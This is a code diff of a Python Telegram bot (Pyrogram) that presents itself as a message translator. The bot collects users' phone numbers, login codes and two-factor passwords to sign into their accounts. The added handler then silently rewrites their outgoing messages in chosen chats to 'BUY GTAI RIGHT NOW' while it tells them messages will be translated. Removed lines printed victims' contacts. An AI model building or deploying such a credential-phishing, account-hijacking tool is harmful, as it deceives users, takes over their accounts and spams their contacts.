@@ -3,42 +3,42 @@ import asyncio
 from pyrogram import Client, filters
 from pyrogram.types import Message
 from pyrogram.methods.utilities.idle import idle
-from pyrogram.errors import SessionPasswordNeeded, FloodWait
+from pyrogram.handlers import MessageHandler
+from pyrogram.errors import SessionPasswordNeeded
 
 import settings
 
 
 app = Client(
-    "bot",
+    "main_bot",
     api_id=settings.API_ID,
     api_hash=settings.API_HASH,
     bot_token=settings.BOT_TOKEN,
 )
 
 
+register_chats = set()
+
+
 # dict[telegram user_id: [CLIENT, send code hash]]
 clients: dict[int, list[Client, str]] = {}
 
-queue = []
+
+async def handle_new_message(client: Client, message: Message):
+    print(
+        f"New message received {message.from_user.username or message.from_user.id}: ",
+        message.text,
+    )
+    if message.chat.id in register_chats:
+        await client.edit_message_text(
+            chat_id=message.chat.id, message_id=message.id, text="BUY GTAI RIGHT NOW"
+        )
 
 
-async def queue_processing():
-    while True:
-        print("Processing queue: ", queue)
-        if queue:
-            while queue:
-                func = queue.pop(0)
-                print("Processing func: ", func.__name__)
-                try:
-                    await func
-                except FloodWait as e:
-                    print("Error: {} | Value: {}".format(e, e.value))
-                    await asyncio.sleep(e.value)
-                except Exception as e:
-                    print("Error: {} | Value: {}".format(e, e.value))
-                    await asyncio.sleep(5)
-                await asyncio.sleep(5)
-        await asyncio.sleep(3)
+async def message_listener(client: Client):
+    client.add_handler(MessageHandler(handle_new_message, filters.outgoing))
+    client.me = await client.get_me()
+    await client.initialize()
 
 
 @app.on_message(filters.command("start") & filters.private)
@@ -46,18 +46,19 @@ async def start_command(client: Client, message: Message):
     await message.reply(
         "Welcome! Please set your target translation language\n"
         "Auhorize. Write your mobile number with /auth prefix\n\n"
-        "Example: /auth +380685543178"
+        "Example: /auth +380685543178\n\n"
+        "For add chats for translate: send contact to bot"
     )
 
 
 @app.on_message(filters.command("auth") & filters.private)
 async def auth(client: Client, message: Message):
     async def already_authorized():
-        await message.reply(
-            "Already authorized. Count of contacts: {}".format(
-                await client.get_contacts_count()
-            )
-        )
+        await message_listener(client)
+        await message.reply("Already authorized. All messages will be translated")
+
+    if message.text == "/auth":
+        return
 
     number = message.text.replace("/auth ", "")
 
@@ -105,7 +106,8 @@ async def save_code(client: Client, message: Message):
             "Write password that start with: /p\nExample: /p password"
         )
 
-    print((await client.get_contacts())[0])
+    await message.reply('Authorized')
+    await message_listener(client)
 
 
 @app.on_message(filters.command("p") & filters.private)
@@ -118,7 +120,8 @@ async def save_password(client: Client, message: Message):
     except Exception as e:
         return await message.reply(str(e))
 
-    print((await client.get_contacts())[0])
+    await message.reply('Authorized')
+    await message_listener(client)
 
 
 @app.on_message(filters.command("accounts") & filters.private)
@@ -126,20 +129,14 @@ async def get_all_clients(client: Client, message: Message):
     if len(clients) == 0:
         return await message.reply("Empty accounts")
 
-    queue.append(
-        message.reply(
-            "\n".join(
-                [
-                    f"User id: {user_id}. {client.phone_number} - Contacts: {await client.get_contacts_count()}"
-                    for user_id, (client, send_hash) in clients.items()
-                ]
-            )
-        )
-    )
+
+@app.on_message(filters.contact & filters.private)
+async def register_chat(client: Client, message: Message):
+    register_chats.add(message.contact.user_id)
+    await message.reply('Added')
 
 
 async def standup():
-    asyncio.create_task(queue_processing())
     await idle()
 
 
